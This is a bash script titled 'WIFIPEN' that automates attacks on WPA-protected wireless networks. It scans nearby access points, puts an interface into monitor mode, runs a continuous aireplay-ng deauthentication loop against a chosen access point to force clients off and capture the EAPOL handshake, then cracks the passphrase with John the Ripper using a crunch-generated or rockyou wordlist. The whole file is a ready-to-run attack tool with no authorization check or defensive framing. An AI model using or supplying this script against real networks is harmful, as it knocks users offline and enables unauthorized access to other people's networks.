#!/bin/bash

GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
NC="\e[0m"
capture_dir="captures"
tmp_prefix="scan_tmp"
log_file="wifipen.log"

script_dir="$(pwd)"

check_dependencies() {
    echo -e "${YELLOW}[*] Checking dependencies...${NC}" | tee -a "$log_file"
    required_tools=(airmon-ng airodump-ng aireplay-ng iw crunch hcxpcapngtool wpapcap2john john)
    missing=()

    for tool in "${required_tools[@]}"; do
        if ! command -v $tool &>/dev/null; then
            missing+=("$tool")
        fi
    done

    if [ ${#missing[@]} -eq 0 ]; then
        echo -e "${GREEN}[+] All dependencies are installed.${NC}" | tee -a "$log_file"
    else
        echo -e "${RED}[!] Missing: ${missing[*]}${NC}" | tee -a "$log_file"
        echo -n "Install missing packages? (y/n): "; read answer
        if [[ "$answer" == "y" ]]; then
            sudo apt update
            for dep in "${missing[@]}"; do
                case $dep in
                    hcxpcapngtool|wpapcap2john)
                        sudo apt install -y hcxtools
                        ;;
                    john)
                        sudo apt install -y john
                        ;;
                    *)
                        sudo apt install -y "$dep"
                        ;;
                esac
            done
        else
            echo -e "${RED}[!] Aborting.${NC}" | tee -a "$log_file"
            exit 1
        fi
    fi
}

create_wordlist() {
    echo -e "${YELLOW}[*] Creating a custom wordlist using crunch...${NC}" | tee -a "$log_file"
    echo -n "Enter prefix (must be < 8 characters): "; read prefix
    len=${#prefix}
    if (( len >= 8 )); then
        echo -e "${RED}[!] Prefix too long. Must be less than 8 characters.${NC}"
        return
    fi
    remaining=$((8 - len))
    pattern="${prefix}"
    for ((i = 0; i < remaining; i++)); do
        pattern+='@'
    done
    echo "Generated pattern: $pattern"
    echo -n "Enter output file name for wordlist: "; read wordlist_file
    crunch 8 8 -t "$pattern" -o "$script_dir/$wordlist_file"
    echo -e "${GREEN}[+] Wordlist saved to $script_dir/$wordlist_file${NC}" | tee -a "$log_file"
}

select_wordlist() {
    local default_wordlist="/usr/share/wordlists/rockyou.txt"

    echo -n "Enter full path to your wordlist file (default: $default_wordlist): "
    read input_path

    if [[ -z "$input_path" ]]; then
        wordlist_path="$default_wordlist"
    else
        wordlist_path="$input_path"
    fi

    if [[ ! -f "$wordlist_path" ]]; then
        echo -e "${RED}[!] Wordlist not found at $wordlist_path${NC}" | tee -a "$log_file"
        exit 1
    fi

    echo -e "${GREEN}[+] Using wordlist: $wordlist_path${NC}" | tee -a "$log_file"
}

select_interface() {
    interfaces=($(iw dev | awk '$1=="Interface"{print $2}'))
    echo -e "${GREEN}Available wireless interfaces:${NC}" | tee -a "$log_file"
    for i in "${!interfaces[@]}"; do
        echo "$((i+1))) ${interfaces[$i]}"
    done
    echo -n "Select interface number: "; read idx
    iface="${interfaces[$((idx-1))]}"
    echo -e "${GREEN}Selected interface: $iface${NC}" | tee -a "$log_file"
}

enable_monitor_mode() {
    echo -e "${YELLOW}[*] Enabling monitor mode...${NC}" | tee -a "$log_file"
    sudo ip link set $iface down
    sudo iw $iface set monitor control
    sudo ip link set $iface up
    echo -e "${GREEN}[+] Monitor mode enabled.${NC}" | tee -a "$log_file"
}

scan_networks() {
    echo -e "${YELLOW}[*] Scanning networks for 15 seconds...${NC}" | tee -a "$log_file"
    sudo timeout 15s airodump-ng -w $tmp_prefix --output-format csv "$iface" > /dev/null 2>&1
    echo -e "\n${GREEN}Available Networks:${NC}" | tee -a "$log_file"

    AP_LIST=()
    IFS=$'\n'
    for line in $(grep -a -E "^([0-9A-F]{2}:){5}[0-9A-F]{2}," $tmp_prefix-01.csv | head -n 20); do
        bssid=$(echo $line | cut -d',' -f1 | xargs)
        channel=$(echo $line | cut -d',' -f4 | xargs)
        essid=$(echo $line | cut -d',' -f14 | xargs)
        if [[ -n "$bssid" && -n "$essid" ]]; then
            AP_LIST+=("$bssid|$channel|$essid")
            idx=${#AP_LIST[@]}
            echo "$idx) ESSID: $essid | BSSID: $bssid | CH: $channel"
        fi
    done
    unset IFS

    echo -n "Pick AP number: "; read choice
    IFS='|' read bssid channel essid <<< "${AP_LIST[$((choice-1))]}"
    echo -n "Enter name for capture file: "; read filename
    mkdir -p "$capture_dir"
    cap_base="$capture_dir/$filename"

    cleanup() {
        echo -e "\n${YELLOW}[*] Cleaning up...${NC}" | tee -a "$log_file"
        sudo kill $CAP_PID $DEAUTH_LOOP_PID 2>/dev/null
        sudo ip link set $iface down
        sudo iw $iface set type managed
        sudo ip link set $iface up
        rm -f $tmp_prefix-01.csv
    }

    convert_and_crack() {
        capfile="$(ls $cap_base*.cap 2>/dev/null | head -n1)"
        if [[ -f "$capfile" ]]; then
            echo -e "${YELLOW}[*] Converting to John format...${NC}" | tee -a "$log_file"
            wpapcap2john "$capfile" > "$cap_base.john"
            echo -e "${GREEN}[+] John file: $cap_base.john${NC}" | tee -a "$log_file"
            echo -e "${YELLOW}[*] Launching John...${NC}" | tee -a "$log_file"
            john --wordlist="$wordlist_path" "$cap_base.john"
            echo -e "${YELLOW}[*] Showing cracked password:${NC}" | tee -a "$log_file"
            john --show "$cap_base.john"
        else
            echo -e "${RED}[!] .cap file not found. Capture failed?${NC}" | tee -a "$log_file"
        fi
    }

    echo -e "${YELLOW}[*] Capturing...${NC}" | tee -a "$log_file"
    sudo airodump-ng --bssid "$bssid" -c "$channel" -w "$cap_base" --output-format cap "$iface" > "$log_file" 2>&1 &
    CAP_PID=$!

    sleep 3
    echo -e "${YELLOW}[*] Deauth loop started...${NC}" | tee -a "$log_file"
    (
        while kill -0 $CAP_PID 2>/dev/null; do
            sudo aireplay-ng --deauth 10 -a "$bssid" "$iface" >/dev/null 2>&1
            sleep 5
        done
    ) & DEAUTH_LOOP_PID=$!

    echo -e "${YELLOW}[*] Watching for EAPOL handshake...${NC}" | tee -a "$log_file"
    while kill -0 $CAP_PID 2>/dev/null; do
        if grep -q "EAPOL" "$log_file"; then
            echo -e "${GREEN}[+] EAPOL Handshake detected!${NC}" | tee -a "$log_file"
            sudo kill $CAP_PID $DEAUTH_LOOP_PID 2>/dev/null
            break
        fi
        sleep 2
    done

    cleanup
    convert_and_crack
}

main_menu() {
    while true; do
        echo
        echo "==== WIFIPEN MENU ===="
        echo "1) Check Dependencies"
        echo "2) Create Wordlist"
        echo "3) Select Wordlist"
        echo "4) Select Interface"
        echo "5) Enable Monitor Mode"
        echo "6) Scan & Capture Handshake"
        echo "7) Exit"
        echo "========================"
        echo -n "Select: "; read opt
        case $opt in
            1) check_dependencies ;;
            2) create_wordlist ;;
            3) select_wordlist ;;
            4) select_interface ;;
            5) enable_monitor_mode ;;
            6) scan_networks ;;
            7) echo "Bye!"; exit 0 ;;
            *) echo "Invalid option." ;;
        esac
    done
}

# === Start ===
clear
trap "echo -e '\n${RED}[!] Ctrl+C pressed. Cleaning up...${NC}'; cleanup; exit" SIGINT
main_menu